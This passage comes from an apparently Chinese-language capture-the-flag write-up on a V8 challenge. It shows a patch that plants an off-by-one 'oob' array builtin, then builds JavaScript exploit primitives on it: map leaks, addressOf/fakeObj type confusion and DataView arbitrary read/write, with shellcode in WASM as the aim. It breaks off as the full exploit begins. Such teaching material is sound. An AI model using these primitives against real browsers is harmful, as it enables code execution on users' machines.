class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>嗯。。。。。。，好像看的不太懂，这里简单解释一下<br>这里主要是出题人为 <code>array</code> 定义了一个 <code>oob</code> 函数，其函数的功能如下：  </p><ul><li>获取参数的数量，然后根据参数个数进行不同的操作  </li><li>如果参数数量大于 <code>2</code> 则直接抛出 <code>undefined</code>  </li><li>如果参数数量小于等于 <code>2</code>，则先把 <code>array</code> 转成 <code>doublearray</code>  </li><li>然后判断如果无额外参数（第一个是 <code>this</code>），则是 <code>read</code> 功能，返回 <code>array[length]</code>  </li><li>如果传入了一个参数，则是 <code>write</code> 功能，将 <code>value</code> 写入到 <code>doublearray[length]</code> 中</li></ul><p>这里的漏洞还是挺好发现了，我们知道 <code>array</code> 最后一个元素的索引为 <code>length - 1</code>， 而这里可以索引到 <code>length</code>，也就是说我们可以在 <code>elements</code> 中越界读和写一个索引的数据<br>在上面的分析中我们知道 <code>elements</code> 是在 <code>obj</code> 的上方的，当时我也说过 <code>elements</code> 并不一定紧贴着 <code>obj</code> 的，现在我就来分析一下这个问题。<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000│  0x20bd84310a41 ◂— 0x10c0b35408</span><br><span class="line">01:0008│  0x20bd84310a49 ◂— 0x4000000</span><br><span class="line">02:0010│  0x20bd84310a51 ◂— 0x1000000</span><br><span class="line">03:0018│  0x20bd84310a59 ◂— 0x2000000</span><br><span class="line">04:0020│  0x20bd84310a61 ◂— 0x3000000</span><br><span class="line">05:0028│  0x20bd84310a69 ◂— 0x5100000004000000</span><br><span class="line">06:0030│  0x20bd84310a71 ◂— 0x10c0b35408</span><br><span class="line">07:0038│  0x20bd84310a79 ◂— 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>怪，可以看见在 <code>elements</code> 到 <code>obj</code> 的中间存在一些数据，于是我好奇去看看这是什么东西  </p><img src="/2024/05/05/v8start/8.png" class="" title="我的图图呢">  <p>好家伙，居然还会存在一个别的结构。算了，这不是我这个初学者该了解的东西，等学深入了再研究吧，暂时不影响解题<br>既然全为整数的 <code>array</code> 的 <code>elements</code> 无法紧贴着 <code>obj</code>，那存在浮点数的 <code>array</code> 呢？<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>运行结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000│  0x116059b90af1 ◂— 0x3ffe4d4014</span><br><span class="line">01:0008│  0x116059b90af9 ◂— 0x9a00000004000000</span><br><span class="line">02:0010│  0x116059b90b01 ◂— 0x9a3ff19999999999</span><br><span class="line">03:0018│  0x116059b90b09 ◂— 0x40019999999999</span><br><span class="line">04:0020│  0x116059b90b11 ◂— 0x40080000000000</span><br><span class="line">05:0028│  0x116059b90b19 ◂— 0xd940100000000000</span><br><span class="line">06:0030│  0x116059b90b21 ◂— 0x7100000ce399302e</span><br><span class="line">07:0038│  0x116059b90b29 ◂— 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见带浮点数数组的 <code>elements</code> 是紧贴着 <code>obj</code> 的，这符合我们漏洞的利用<br>首先尝试利用一下能否利用该漏洞来泄露出 <code>obj</code> 中 <code>map</code> 的值  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经成功的泄露出了 <code>map</code>。同理，我们也可以用类似的方法去修改 <code>map</code><br>为了能够在 <code>WASM</code> 上写入我们的 <code>shellcode</code>，我们需要任意地址写和地址泄露，这时候就需要用到类型混淆  </p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>在上面已经说过，<code>v8</code> 是通过 <code>map</code> 所指向的区域来判断该对象是什么类型，也就是说，如果我们吧一个存储 <code>obj</code> 的 <code>array</code> 的 <code>map</code> 修改为存在浮点数数组的 <code>map</code>，这时候我们就能够直接获取到该对象的地址。我们可以将该原语封装成一个 <code>addressOf</code> 函数  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>addressOf</code> 函数的功能为获取指定对象 <code>obj</code> 的地址，建议读者仔细阅读和理解该函数的实现原理<br>同理，我们也可以用类似的思路来实现任意地址的写，不过有一点点绕  </p><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>任意地址写的思想为伪造一个 <code>object</code>，根据类型混淆可以将该原语封装成一个函数：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是希望读者可以自行思考和理解该原语是如何实现伪造 <code>object</code> 的。<br>我们伪造的 <code>object</code> 是在 <code>elements</code> 上面的，而 <code>elements</code> 上的数据是可控的，我们可以按照如下样式伪造一个存在浮点数的 <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这里伪造的是一个没有原型的存在浮点数的 <code>objcet</code>，<code>target</code> 为我们想要进行写的地址，也就是伪造的 <code>elements</code><br>我们可以在泄露出 <code>float_array_mem</code> 的地址后通过 <code>fakeObj(fake_obj_addr)</code> 函数来获取我们的 <code>fake object</code>，然后向 <code>target</code> 写入数据。至于为什么 <code>target</code> 要 <code>-0x10</code> 呢，因为 <code>elements</code> 上面有 <code>0x10</code> 字节用于存储 <code>map</code> 和 <code>length</code><br>有了对象地址泄露和任意地址写，我们就以为能够在 <code>WASM</code> 上愉快的写 <code>shellcode</code> 了，可事情并没有这么简单，即在写 <code>0x7fxxxxx</code> 这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。因为写原语使用的是 <code>FloatArray</code> 的写入操作，而 <code>Double</code> 类型的浮点数数组在处理 <code>7f</code> 开头的高地址时会出现将低 <code>20</code> 位与运算为 <code>0</code><br>这时候我们就要使用 <code>DataView </code>对象，该对象的结构如下：  </p><img src="/2024/05/05/v8start/9.png" class="" title="我的图图呢">  <p>这是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 <code>exploit</code> 里常用作最后的任意地址读写原语的构造。<br>可以看见这个 <code>DataView</code> 多了一个 <code>BackingStore</code>。<code>DataView</code> 对象中的 <code>backing_store</code> 会指向申请的 <code>data_buf</code> (<code>backing_store</code> 相当于我们的 <code>elements</code>)，修改 <code>backing_store</code> 为我们想要写的地址，并通过 <code>DataView</code> 对象的 <code>setBigUint64</code> 方法就可以往指定地址正常写入数据了。<br>那现在我们的思路就很明确了，首先申请 <code>2</code> 个 <code>ArrayBuffer</code> 对象 <code>ab1</code>、<code>ab2</code>，申请他们各自的 <code>DataView</code> 对象 <code>dv1</code>、<code>dv2</code>。将伪造的 <code>fakeobj</code> 的 <code>elements</code> 指向 <code>dv1</code> 的 <code>BackingStore-0x10</code>，再通过修改 <code>fakeobj</code> 令 <code>dv1</code> 的 <code>BackingStore</code> 指向 <code>dv2</code> 的 <code>BackingStore-0x10</code><br>此时，我们可以通过修改 <code>fakeobj</code> 来修改 <code>dv2</code> <code>BackingStore</code> 处的值，最后通过 <code>dv2</code> 的内置函数来实现任意地址的读写。提醒一下，这里要区分开 <code>BackingStore</code> 的地址和 <code>BackingStore</code> 地址出的值这2个概念。原语封装函数如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span 